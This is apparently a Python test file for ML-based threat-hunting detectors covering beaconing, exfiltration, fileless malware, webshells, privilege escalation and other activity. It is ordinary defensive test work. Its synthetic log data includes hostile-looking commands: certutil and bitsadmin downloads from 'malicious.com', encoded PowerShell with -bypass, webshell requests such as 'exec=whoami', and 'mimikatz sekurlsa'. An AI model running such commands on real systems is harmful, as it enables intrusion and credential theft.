"""
Test ML features in threat hunting strategies.

Tests the machine learning enhancements to verify they work correctly
with sufficient data and gracefully fall back when insufficient data.
"""

import unittest
import pandas as pd
import numpy as np
from datetime import datetime, timedelta
from strategies import (
    BeaconStrategy, EntropyStrategy, ExfilStrategy,
    TimeAnomalyStrategy, GeoAnomalyStrategy, CryptoMiningStrategy, FilelessMalwareStrategy,
    AccountTakeoverStrategy, TunnelingStrategy, APIAbuseStrategy,
    DataStagingStrategy, WebshellDetectionStrategy, PrivilegeEscalationStrategy,
    HAS_SKLEARN
)


class TestMLFeatures(unittest.TestCase):
    """Test ML-enhanced strategies."""
    
    def test_beacon_ml_with_sufficient_data(self):
        """Test that BeaconStrategy applies ML with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = BeaconStrategy()
        
        # Create 60 beaconing pairs (above ML_MIN_SAMPLES threshold)
        base_time = datetime.now()
        data = []
        
        for pair_id in range(60):
            src_ip = f'192.168.1.{pair_id}'
            dst_ip = f'10.0.0.{pair_id % 10}'
            
            # Create regular beaconing pattern
            for i in range(20):
                data.append({
                    'timestamp': base_time + timedelta(seconds=60 * i),
                    'source_ip': src_ip,
                    'dest_ip': dst_ip
                })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_anomaly_score', result.columns)
        self.assertIn('ml_confidence', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify ML columns have values (not N/A)
        self.assertFalse((result['ml_confidence'] == 'N/A (insufficient data or sklearn not available)').all())
        
        # ML scores should be numeric
        self.assertTrue(pd.api.types.is_numeric_dtype(result['ml_anomaly_score']))
        
        print(f"✓ BeaconStrategy ML test passed: {len(result)} detections with ML analysis")
    
    def test_beacon_ml_with_insufficient_data(self):
        """Test that BeaconStrategy falls back gracefully with <50 samples."""
        strategy = BeaconStrategy()
        
        # Create only 10 beaconing pairs (below threshold)
        base_time = datetime.now()
        data = []
        
        for pair_id in range(10):
            src_ip = f'192.168.1.{pair_id}'
            dst_ip = f'10.0.0.{pair_id % 3}'
            
            for i in range(20):
                data.append({
                    'timestamp': base_time + timedelta(seconds=60 * i),
                    'source_ip': src_ip,
                    'dest_ip': dst_ip
                })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present but indicate fallback
        self.assertIn('ml_anomaly_score', result.columns)
        self.assertIn('ml_confidence', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify fallback message
        self.assertTrue('insufficient data' in result.iloc[0]['ml_explanation'].lower() or
                       'rule-based detection only' in result.iloc[0]['ml_explanation'].lower())
        
        print(f"✓ BeaconStrategy fallback test passed: {len(result)} detections with rule-based only")
    
    def test_entropy_ml_with_sufficient_data(self):
        """Test that EntropyStrategy applies clustering with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = EntropyStrategy()
        
        # Create 60 suspicious high-entropy strings
        data = []
        
        # Group 1: Long, high-entropy (tunneling)
        for i in range(25):
            data.append({
                'target_string': f'abcd{i}efgh.ijklmnop.qrstuvwx.yz123456789.example.com'
            })
        
        # Group 2: Short, high-entropy (DGA)
        for i in range(25):
            data.append({
                'target_string': f'xf{i}gh8jk2lmnp3qr7st.com'
            })
        
        # Group 3: Medium entropy, long
        for i in range(10):
            data.append({
                'target_string': f'verylongsubdomain{i}withlotsofcharacters.suspicious.domain.com'
            })
        
        df = pd.DataFrame(data)
        col_map = {'target_string': 'target_string'}
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_cluster', result.columns)
        self.assertIn('ml_cluster_risk', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify clustering was applied
        self.assertFalse((result['ml_cluster'] == 'N/A').all())
        
        # Should have multiple clusters
        unique_clusters = result['ml_cluster'].nunique()
        self.assertGreater(unique_clusters, 1, "Should have multiple clusters")
        
        print(f"✓ EntropyStrategy ML test passed: {len(result)} detections in {unique_clusters} clusters")
    
    def test_exfil_ml_with_sufficient_data(self):
        """Test that ExfilStrategy applies LOF with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = ExfilStrategy()
        
        # Create 60 hosts with varying traffic patterns
        data = []
        
        # Most hosts: normal download-heavy traffic
        for i in range(45):
            data.append({
                'source_ip': f'192.168.1.{i}',
                'bytes_out': np.random.randint(100000, 500000),  # 100KB-500KB upload
                'bytes_in': np.random.randint(1000000, 5000000)  # 1MB-5MB download
            })
        
        # Few hosts: suspicious upload-heavy traffic (outliers)
        for i in range(45, 60):
            data.append({
                'source_ip': f'192.168.1.{i}',
                'bytes_out': np.random.randint(5000000, 10000000),  # 5MB-10MB upload
                'bytes_in': np.random.randint(100000, 500000)       # 100KB-500KB download
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'bytes_out': 'bytes_out',
            'bytes_in': 'bytes_in'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_outlier_score', result.columns)
        self.assertIn('ml_confidence', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify ML was applied
        self.assertFalse((result['ml_confidence'] == 'N/A (insufficient data or sklearn not available)').all())
        
        # ML scores should be numeric
        self.assertTrue(pd.api.types.is_numeric_dtype(result['ml_outlier_score']))
        
        print(f"✓ ExfilStrategy ML test passed: {len(result)} detections with outlier analysis")
    
    def test_time_anomaly_ml_with_sufficient_data(self):
        """Test that TimeAnomalyStrategy applies ML with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = TimeAnomalyStrategy()
        
        # Create 60 sources with varying off-hours activity (above ML_MIN_SAMPLES)
        base_time = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        data = []
        
        # Most sources: high off-hours activity
        for src_id in range(60):
            src_ip = f'192.168.1.{src_id}'
            
            # Generate activity: 70% off-hours for most
            off_hours_ratio = 0.7 if src_id < 45 else 0.9  # Some are even worse
            total_events = np.random.randint(30, 100)
            
            for event_id in range(total_events):
                # Determine if this event is off-hours
                if np.random.random() < off_hours_ratio:
                    # Off-hours: late night or weekend
                    hour = np.random.choice([2, 3, 4, 22, 23])
                    day_offset = np.random.randint(0, 7)
                else:
                    # Business hours
                    hour = np.random.choice([9, 10, 11, 14, 15, 16])
                    day_offset = np.random.choice([0, 1, 2, 3, 4])  # Weekdays only
                
                data.append({
                    'timestamp': base_time + timedelta(days=int(day_offset), hours=int(hour), minutes=int(np.random.randint(0, 60))),
                    'source_ip': src_ip
                })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_anomaly_score', result.columns)
        self.assertIn('ml_confidence', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify ML was applied
        self.assertFalse((result['ml_confidence'] == 'N/A (insufficient data or sklearn not available)').all())
        
        # ML scores should be numeric
        self.assertTrue(pd.api.types.is_numeric_dtype(result['ml_anomaly_score']))
        
        print(f"✓ TimeAnomalyStrategy ML test passed: {len(result)} detections with ML analysis")
    
    def test_geo_anomaly_ml_with_sufficient_data(self):
        """Test that GeoAnomalyStrategy applies ML with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = GeoAnomalyStrategy()
        
        # Create 100 sources with varying geographic patterns that will trigger detections
        # Need more sources since not all will meet detection threshold
        data = []
        
        # All sources have either multiple countries or high-risk countries to trigger detection
        # Group 1: High-risk countries (40 sources) - triggers 40 points
        for src_id in range(40):
            src_ip = f'192.168.1.{src_id}'
            countries = ['CN', 'RU']
            for country in countries:
                for _ in range(np.random.randint(10, 30)):
                    data.append({
                        'source_ip': src_ip,
                        'country_code': country
                    })
        
        # Group 2: Multiple countries (40 sources) - triggers 20 points + 40 for high-risk = 60
        for src_id in range(40, 80):
            src_ip = f'192.168.1.{src_id}'
            countries = np.random.choice(['US', 'CN', 'DE', 'FR'], size=3, replace=False)
            for country in countries:
                for _ in range(np.random.randint(5, 15)):
                    data.append({
                        'source_ip': src_ip,
                        'country_code': country
                    })
        
        # Group 3: Many countries (20 sources) - triggers 30 points + possibly high-risk
        for src_id in range(80, 100):
            src_ip = f'192.168.1.{src_id}'
            countries = np.random.choice(['US', 'CN', 'RU', 'DE', 'FR', 'GB'], size=5, replace=False)
            for country in countries:
                for _ in range(np.random.randint(5, 10)):
                    data.append({
                        'source_ip': src_ip,
                        'country_code': country
                    })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'country_code': 'country_code'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_anomaly_score', result.columns)
        self.assertIn('ml_confidence', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify ML was applied
        self.assertFalse((result['ml_confidence'] == 'N/A (insufficient data or sklearn not available)').all())
        
        # ML scores should be numeric
        self.assertTrue(pd.api.types.is_numeric_dtype(result['ml_anomaly_score']))
        
        print(f"✓ GeoAnomalyStrategy ML test passed: {len(result)} detections with ML analysis")
    
    def test_crypto_mining_ml_with_sufficient_data(self):
        """Test that CryptoMiningStrategy applies ML with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = CryptoMiningStrategy()
        
        # Create 60 sources with mining patterns that trigger detection (need MIN_CONNECTIONS=10 and score>=50)
        data = []
        
        # All sources have patterns that trigger detection
        for src_id in range(60):
            src_ip = f'192.168.1.{src_id}'
            
            # Vary the pattern - all should meet threshold
            if src_id < 20:
                # Mining ports with high persistence - triggers 40 (ports) + 20 (persistence) = 60 points
                destinations = [f'10.0.0.{i}' for i in range(2)]
                port = 3333  # Mining port
                connections = 100
            elif src_id < 40:
                # Mining ports with moderate persistence - triggers 40 (ports) + 15 (persistence) = 55 points
                destinations = [f'10.0.1.{i}' for i in range(5)]
                port = 4444  # Mining port
                connections = 100
            else:
                # Mining ports with regular pattern - triggers 40 (ports) + 10 (pattern) = 50 points
                destinations = [f'10.0.2.{i}' for i in range(8)]
                port = 5555  # Mining port
                connections = 160
            
            for dest in destinations:
                for _ in range(connections // len(destinations)):
                    data.append({
                        'source_ip': src_ip,
                        'dest_ip': dest,
                        'dest_port': port
                    })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'dest_port': 'dest_port'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_anomaly_score', result.columns)
        self.assertIn('ml_confidence', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify ML was applied
        self.assertFalse((result['ml_confidence'] == 'N/A (insufficient data or sklearn not available)').all())
        
        # ML scores should be numeric
        self.assertTrue(pd.api.types.is_numeric_dtype(result['ml_anomaly_score']))
        
        print(f"✓ CryptoMiningStrategy ML test passed: {len(result)} detections with ML analysis")
    
    def test_fileless_malware_ml_with_sufficient_data(self):
        """Test that FilelessMalwareStrategy applies clustering with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = FilelessMalwareStrategy()
        
        # Create 60 sources with varying fileless patterns
        data = []
        
        # Group 1: PowerShell with encoding (25 sources)
        for src_id in range(25):
            src_ip = f'192.168.1.{src_id}'
            for event_id in range(np.random.randint(10, 20)):
                data.append({
                    'source_ip': src_ip,
                    'process_name': 'powershell.exe',
                    'command_line': f'powershell.exe -enc {np.random.randint(1000, 9999)} -noprofile -bypass'
                })
        
        # Group 2: WMI with invoke-expression (20 sources)
        for src_id in range(25, 45):
            src_ip = f'192.168.1.{src_id}'
            for event_id in range(np.random.randint(8, 15)):
                data.append({
                    'source_ip': src_ip,
                    'process_name': 'wmic.exe',
                    'command_line': f'wmic process call create "cmd /c invoke-expression {np.random.randint(100, 999)}"'
                })
        
        # Group 3: Multiple LOLBins (15 sources)
        for src_id in range(45, 60):
            src_ip = f'192.168.1.{src_id}'
            processes = ['certutil.exe', 'bitsadmin.exe', 'rundll32.exe']
            for proc in processes:
                for event_id in range(np.random.randint(3, 8)):
                    data.append({
                        'source_ip': src_ip,
                        'process_name': proc,
                        'command_line': f'{proc} downloadfile http://malicious.com/{np.random.randint(1, 100)}'
                    })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'process_name': 'process_name',
            'command_line': 'command_line'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_cluster', result.columns)
        self.assertIn('ml_cluster_risk', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify clustering was applied
        self.assertFalse((result['ml_cluster'] == 'N/A').all())
        
        # Should have multiple clusters
        unique_clusters = result['ml_cluster'].nunique()
        self.assertGreater(unique_clusters, 1, "Should have multiple clusters")
        
        print(f"✓ FilelessMalwareStrategy ML test passed: {len(result)} detections in {unique_clusters} clusters")
    
    def test_account_takeover_ml_with_sufficient_data(self):
        """Test that AccountTakeoverStrategy applies ML with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = AccountTakeoverStrategy()
        
        # Create 60 users with varying authentication patterns
        base_time = datetime.now()
        data = []
        
        for user_id in range(60):
            username = f'user{user_id}'
            # Some users have normal patterns, some suspicious
            num_ips = np.random.choice([1, 2, 5, 10], p=[0.4, 0.3, 0.2, 0.1])
            fail_rate = np.random.choice([0.0, 0.1, 0.5, 0.8], p=[0.4, 0.3, 0.2, 0.1])
            
            for event_id in range(20):
                ip_idx = np.random.randint(0, num_ips)
                is_failure = np.random.random() < fail_rate
                
                data.append({
                    'timestamp': base_time + timedelta(minutes=event_id * 5),
                    'username': username,
                    'source_ip': f'10.0.{user_id}.{ip_idx}',
                    'action': 'login',
                    'status': 'failure' if is_failure else 'success'
                })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'username': 'username',
            'source_ip': 'source_ip',
            'action': 'action',
            'status': 'status'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_anomaly_score', result.columns)
        self.assertIn('ml_confidence', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify ML was applied (not N/A)
        if not result.empty:
            self.assertFalse((result['ml_confidence'] == 'N/A (insufficient data or sklearn not available)').all())
        
        print(f"✓ AccountTakeoverStrategy ML test passed: {len(result)} detections with ML analysis")
    
    def test_tunneling_ml_with_sufficient_data(self):
        """Test that TunnelingStrategy applies ML with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = TunnelingStrategy()
        
        # Create 60 connections with varying traffic patterns
        data = []
        
        for conn_id in range(60):
            src_ip = f'192.168.1.{conn_id}'
            dst_ip = f'10.0.0.{conn_id % 10}'
            # Mix of standard and non-standard ports with various byte volumes
            port = np.random.choice([22, 80, 443, 8080, 1234, 5555, 9999])
            bytes_total = np.random.choice([50000, 500000, 5000000, 50000000])
            
            for conn in range(np.random.randint(5, 30)):
                data.append({
                    'source_ip': src_ip,
                    'dest_ip': dst_ip,
                    'dest_port': port,
                    'bytes_total': bytes_total + np.random.randint(-10000, 10000)
                })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_ip': 'dest_ip',
            'dest_port': 'dest_port',
            'bytes_total': 'bytes_total'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_anomaly_score', result.columns)
        self.assertIn('ml_confidence', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify ML was applied
        if not result.empty:
            self.assertFalse((result['ml_confidence'] == 'N/A (insufficient data or sklearn not available)').all())
        
        print(f"✓ TunnelingStrategy ML test passed: {len(result)} detections with ML analysis")
    
    def test_api_abuse_ml_with_sufficient_data(self):
        """Test that APIAbuseStrategy applies ML with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = APIAbuseStrategy()
        
        # Create 60 sources with varying API usage patterns
        data = []
        
        for source_id in range(60):
            src_ip = f'203.0.113.{source_id}'
            # Mix of normal and abusive patterns
            num_requests = np.random.choice([50, 200, 500, 1000])
            endpoints = [f'/api/v1/endpoint{i}' for i in range(np.random.randint(1, 20))]
            
            for req_id in range(num_requests):
                data.append({
                    'source_ip': src_ip,
                    'url_path': np.random.choice(endpoints),
                    'status_code': np.random.choice(['200', '401', '429', '500'], p=[0.7, 0.1, 0.15, 0.05])
                })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'url_path': 'url_path',
            'status_code': 'status_code'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_anomaly_score', result.columns)
        self.assertIn('ml_confidence', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify ML was applied
        if not result.empty:
            self.assertFalse((result['ml_confidence'] == 'N/A (insufficient data or sklearn not available)').all())
        
        print(f"✓ APIAbuseStrategy ML test passed: {len(result)} detections with ML analysis")
    
    def test_data_staging_ml_with_sufficient_data(self):
        """Test that DataStagingStrategy applies ML with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = DataStagingStrategy()
        
        # Create 60 sources with varying file operation patterns
        base_time = datetime.now()
        data = []
        
        for source_id in range(60):
            src_ip = f'10.10.{source_id // 256}.{source_id % 256}'
            # Mix of normal and suspicious patterns
            num_ops = np.random.choice([10, 30, 100, 200])
            
            for op_id in range(num_ops):
                file_ext = np.random.choice(['.txt', '.doc', '.zip', '.tmp'], p=[0.5, 0.2, 0.2, 0.1])
                sensitive = np.random.choice([True, False], p=[0.2, 0.8])
                path = f'/finance/data/file{op_id}{file_ext}' if sensitive else f'/home/user/file{op_id}{file_ext}'
                
                data.append({
                    'timestamp': base_time + timedelta(seconds=op_id * 2),
                    'source_ip': src_ip,
                    'file_path': path,
                    'operation': np.random.choice(['read', 'write', 'copy']),
                    'file_size': np.random.randint(1000, 50000000)
                })
        
        df = pd.DataFrame(data)
        col_map = {
            'timestamp': 'timestamp',
            'source_ip': 'source_ip',
            'file_path': 'file_path',
            'operation': 'operation',
            'file_size': 'file_size'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_outlier_score', result.columns)
        self.assertIn('ml_confidence', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify ML was applied
        if not result.empty:
            self.assertFalse((result['ml_confidence'] == 'N/A (insufficient data or sklearn not available)').all())
        
        print(f"✓ DataStagingStrategy ML test passed: {len(result)} detections with ML analysis")
    
    def test_webshell_ml_with_sufficient_data(self):
        """Test that WebshellDetectionStrategy applies ML with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = WebshellDetectionStrategy()
        
        # Create 60 sources with varying webshell patterns
        data = []
        
        for source_id in range(60):
            src_ip = f'198.51.100.{source_id}'
            # Mix of normal and suspicious patterns
            num_requests = np.random.randint(10, 100)
            
            for req_id in range(num_requests):
                suspicious = np.random.random() < 0.3
                if suspicious:
                    uri = np.random.choice(['/shell.php', '/c99.php', '/admin/upload.php'])
                    method = 'POST'
                    params = np.random.choice(['cmd=ls', 'exec=whoami', 'shell=true'])
                else:
                    uri = f'/page{req_id}.html'
                    method = 'GET'
                    params = ''
                
                data.append({
                    'source_ip': src_ip,
                    'uri': f'{uri}?{params}',
                    'method': method,
                    'status_code': '200',
                    'user_agent': 'curl/7.68.0' if suspicious else 'Mozilla/5.0'
                })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'uri': 'uri',
            'method': 'method',
            'status_code': 'status_code',
            'user_agent': 'user_agent'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_cluster', result.columns)
        self.assertIn('ml_cluster_risk', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify clustering was applied
        if not result.empty:
            self.assertFalse((result['ml_cluster_risk'] == 'N/A (insufficient data or sklearn not available)').all())
        
        print(f"✓ WebshellDetectionStrategy ML test passed: {len(result)} detections with ML clustering")
    
    def test_privilege_escalation_ml_with_sufficient_data(self):
        """Test that PrivilegeEscalationStrategy applies ML with 50+ samples."""
        if not HAS_SKLEARN:
            self.skipTest("scikit-learn not available")
        
        strategy = PrivilegeEscalationStrategy()
        
        # Create 60 source/user combinations with varying escalation patterns
        data = []
        
        for source_id in range(60):
            src_ip = f'172.16.{source_id // 256}.{source_id % 256}'
            username = f'user{source_id}'
            # Mix of normal admin work and suspicious patterns
            num_commands = np.random.randint(10, 100)
            
            for cmd_id in range(num_commands):
                suspicious = np.random.random() < 0.4
                if suspicious:
                    process = np.random.choice(['powershell.exe', 'cmd.exe', 'mimikatz.exe'])
                    command = np.random.choice(['sudo su', 'net user administrator', 'mimikatz sekurlsa'])
                else:
                    process = np.random.choice(['notepad.exe', 'explorer.exe'])
                    command = 'normal command'
                
                data.append({
                    'source_ip': src_ip,
                    'username': username,
                    'command': command,
                    'process_name': process
                })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'username': 'username',
            'command': 'command',
            'process_name': 'process_name'
        }
        
        result = strategy.analyze(df, col_map)
        
        # Verify ML columns are present
        self.assertIn('ml_anomaly_score', result.columns)
        self.assertIn('ml_confidence', result.columns)
        self.assertIn('ml_explanation', result.columns)
        
        # Verify ML was applied
        if not result.empty:
            self.assertFalse((result['ml_confidence'] == 'N/A (insufficient data or sklearn not available)').all())
        
        print(f"✓ PrivilegeEscalationStrategy ML test passed: {len(result)} detections with ML analysis")
    
    def test_ml_column_explanations(self):
        """Test that ML columns have proper explanations."""
        strategies_to_test = [
            BeaconStrategy(), EntropyStrategy(), ExfilStrategy(),
            TimeAnomalyStrategy(), GeoAnomalyStrategy(), 
            CryptoMiningStrategy(), FilelessMalwareStrategy(),
            AccountTakeoverStrategy(), TunnelingStrategy(), APIAbuseStrategy(),
            DataStagingStrategy(), WebshellDetectionStrategy(), PrivilegeEscalationStrategy()
        ]
        
        for strategy in strategies_to_test:
            explanations = strategy.get_column_explanations()
            
            # Check that ML column explanations exist and start with emoji indicator
            ml_columns = [col for col in explanations.keys() if col.startswith('ml_')]
            
            self.assertGreater(len(ml_columns), 0, 
                             f"{strategy.name} should have ML column explanations")
            
            for ml_col in ml_columns:
                explanation = explanations[ml_col]
                self.assertTrue('🤖' in explanation or 'ML' in explanation,
                              f"ML column {ml_col} should have ML indicator in explanation")
        
        print("✓ All ML-enhanced strategies have proper column explanations")


if __name__ == '__main__':
    unittest.main()
